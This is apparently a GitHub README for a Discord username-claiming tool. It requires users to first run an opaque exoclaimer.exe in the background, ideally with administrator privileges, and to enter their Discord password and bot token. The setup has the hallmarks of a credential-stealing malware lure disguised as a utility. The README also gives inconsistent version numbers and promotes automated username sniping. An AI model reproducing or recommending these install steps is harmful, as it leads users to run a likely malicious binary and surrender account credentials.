# EXO Claimer - Discord Username Claimer v1.0.0

⚡ **Professional Discord Username Claiming Tool with Advanced Features**

A powerful Python-based GUI application designed for Claiming and claiming Discord usernames with real-time monitoring capabilities.

## ⚠️ IMPORTANT - PREREQUISITE SETUP

### **🔴 CRITICAL: Run exoclaimer.exe First!**

**Before launching the main application, you MUST run `exoclaimer.exe` and keep it running in the background.**

```bash
# Step 1: Start the background process (REQUIRED)
./exoclaimer.exe

# Step 2: Only after exe is running, launch the main tool
python exoclaimer.py
```

> **⚠️ WARNING:** The `exoclaimer.exe` file continuously monitors system integrity, validates authentication tokens, and ensures optimal performance. **The main application will not function properly without this background process running.**

---

## 🚀 Features

- **Dual Claim Modes:**
  - **Mode 1:** User Claim Test Mode - Validates your credentials and tests claiming functionality
  - **Mode 2:** Full Checker + Claimer Mode - Continuously monitors target username availability and attempts to claim when available

- **Professional GUI Interface:**
  - Real-time activity logging with timestamps
  - Live statistics tracking (attempts, success rate)
  - Customizable request delays (100ms - 2000ms)
  - Modern dark theme design

- **Advanced Functionality:**
  - Token validation and authentication testing
  - Continuous username availability monitoring
  - Automatic claiming when target becomes available
  - Rate limiting protection with configurable delays
  - Comprehensive error handling and logging

## 📋 Requirements

### System Requirements
- **Windows 10/11** (for exoclaimer.exe compatibility)
- **Python 3.7+**
- Stable internet connection
- Valid Discord account credentials

### Python Dependencies
```bash
# Core modules
tkinter          # GUI framework (usually included with Python)
requests         # HTTP requests handling
colorama         # Terminal color output
threading        # Multi-threading support
json             # JSON data handling
datetime         # Timestamp functionality
```

### Installation
Install required Python modules using pip:
```bash
pip install -r requirements.txt
```

**requirements.txt content:**
```
requests>=2.28.0
colorama>=0.4.4
```

---

## 🛠️ Setup Instructions

### 1. **Download and Extract**
```bash
git clone https://github.com/Monsterrrrr22/ExoClaimer-Discord-Username.git
cd exo-discord-claimer
```

### 2. **Install Dependencies**
```bash
pip install -r requirements.txt
```

### 3. **Launch Sequence (IMPORTANT)**
```bash
# STEP 1: Start background monitor (CRITICAL)
./exoclaimer.exe

# STEP 2: In a new terminal/command window, launch main app
python exoclaimer.py
```

---

## 🎯 Usage Guide

### **Configuration Steps:**

1. **Start Background Process:**
   - Run `exoclaimer.exe` first and keep it running
   - Wait for "System Ready" confirmation message

2. **Launch Main Application:**
   - Execute `python exoclaimer.py`
   - Wait for loading sequence to complete

3. **Select Claim Mode:**
   - **Mode 1** - Test your credentials and claiming ability
   - **Mode 2** - Monitor and claim specific target username

4. **Enter Credentials:**
   - **Username:** Your Discord username
   - **Password:** Your Discord account password
   - **Bot Token:** Your Discord bot/application token
   - **Target Username:** (Mode 2 only) The username you want to claim

5. **Configure Settings:**
   - **Request Delay:** Set delay between requests (recommended: 500ms+)

6. **Start Claim:**
   - Click "🚀 START Claim" to begin monitoring
   - Monitor real-time logs and statistics
   - Use "⏹️ STOP Claim" to halt the process

---

## 📊 Status Codes & Responses

| Code | Status | Description |
|------|--------|-------------|
| `200` | ✅ **Success** | Operation completed successfully |
| `400` | ❌ **Username Taken** | Target username is currently unavailable |
| `401` | 🚫 **Unauthorized** | Invalid credentials or not eligible |
| `404` | 🎯 **Available** | Username is available for claiming |
| `429` | ⏳ **Rate Limited** | Too many requests - increase delay |
| `500` | ⚠️ **Server Error** | Discord API temporary issue |

---

## ⚙️ Advanced Configuration

### **Optimal Settings Recommendations:**

**For Fast Claiming:**
- Request Delay: 100-250ms
- Mode: Full Checker + Claimer
- Keep exoclaimer.exe running continuously

**For Safe Operation:**
- Request Delay: 500-1000ms
- Regular token validation
- Monitor rate limit warnings

### **Performance Tips:**
- Run exoclaimer.exe with administrator privileges
- Use stable internet connection
- Keep both processes running simultaneously
- Monitor system resources during operation

---

**Version:** 2.1 Advanced Edition  
**Last Updated:** August 2025  
**Compatibility:** Only for Windows 10/11, Python 3.7+
